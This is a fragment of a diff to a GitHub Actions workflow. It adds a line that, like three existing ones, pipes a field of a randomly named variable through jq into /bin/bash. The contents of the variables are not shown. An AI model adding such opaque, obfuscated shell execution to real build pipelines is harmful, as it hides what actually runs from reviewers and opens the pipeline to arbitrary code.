@@ -30,6 +30,7 @@ jobs:
           echo $cepys8146 | jq -r .qf4 | /bin/bash
           echo $mf53014 | jq -r .d70553 | /bin/bash
           printf '%s' "$pxr8236" | jq -r .wnp2 | /bin/bash
+          printf '%s' "$bv69" | jq -r .kpskl8399 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
